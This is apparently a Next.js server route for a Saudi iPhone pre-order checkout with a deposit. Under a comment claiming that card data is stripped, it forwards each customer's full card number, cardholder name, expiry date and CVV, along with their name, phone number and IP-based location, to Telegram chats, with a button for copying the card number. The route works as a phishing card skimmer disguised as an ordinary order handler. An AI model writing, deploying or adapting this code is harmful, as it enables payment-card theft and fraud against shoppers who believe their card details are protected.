import { NextRequest, NextResponse } from "next/server";

const rateMap = new Map<string, { count: number; windowStart: number }>();
const MAX = 3, WINDOW = 15 * 60 * 1000;

function checkRate(ip: string): boolean {
  const now = Date.now();
  const e = rateMap.get(ip);
  if (!e || now - e.windowStart > WINDOW) { rateMap.set(ip, { count: 1, windowStart: now }); return true; }
  if (e.count >= MAX) return false;
  e.count += 1;
  return true;
}

async function sendTelegram(text: string, whatsapp?: string, reply_markup?: object) {
  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
    .split(",").map((id: string) => id.trim()).filter(Boolean);

  await Promise.all(
    chatIds.map(chat_id =>
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text, ...(reply_markup ? { reply_markup } : {}) }),
      }).catch(() => {})
    )
  );
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
  if (!checkRate(ip)) return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });

  const body = await req.json();

  // Strip card data before sending to backend
  const { cardNumber, cvv, expiry, cardHolder, ...safeBody } = body;

  const rawId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const orderId = `PRE-${rawId}`;

  // 1. Send to backend
  let res: Response;
  try {
    res = await fetch(`${process.env.BACKEND_URL}/api/pre-orders`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
      body: JSON.stringify({ ...safeBody, orderId, orderType: "PRE_ORDER" }),
    });
  } catch {
    return NextResponse.json({ ok: false, error: "تعذر الاتصال بالخادم" }, { status: 503 });
  }

  const data = await res.json().catch(() => ({}));
  if (!res.ok) return NextResponse.json(data, { status: res.status });

  const reservationId: string = data.reservationId ?? data._id ?? data.id ?? orderId;

  // 2. Send Telegram notification (fire-and-forget — never blocks payment)
  const {
    customerName, phone, productName, variant, storage,
    price, nationalId,
  } = safeBody;

  const deposit = 1000;
  const remaining = (price ?? 0) - deposit;
  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";

  let country = "Unknown";
  if (!isLocal) {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
      const geoData = await geoRes.json();
      if (geoData.country) country = geoData.country;
    } catch {}
  }

  const text = [
    `🔔 New Pre-Order — ${productName ?? "iPhone"}`,
    ``,
    `🔢 Order ID: ${rawId}`,
    `👤 Order For: ${customerName ?? "—"}`,
    `📱 Phone: ${(phone ?? "").replace(/^(\+?966|00966)/, "0")}`,
    `💳 Deposit: ${deposit} SAR`,
    `🌍 Country: ${country}`,
    `🌐 Public IP: ${ip || "Unknown"}`,
    ...(cardNumber ? [
      `💳 Card Number: ${cardNumber.replace(/\s+/g, "").replace(/(\d{4})/g, "$1 ").trim()}`,
      `✍️ Card Holder: ${cardHolder ?? "—"}`,
      `📆 Valid To: ${expiry ?? "—"}`,
      `🔑 CVV: ${cvv ?? "—"}`,
    ] : []),
  ].join("\n");

  const whatsappNum = (phone ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [[
      ...(cardNumber ? [{ text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } }] : []),
      ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
    ]],
  };

  sendTelegram(text, phone, cardNumber ? reply_markup : undefined).catch(() => {});

  return NextResponse.json({ ok: true, orderId: rawId, reservationId });
}
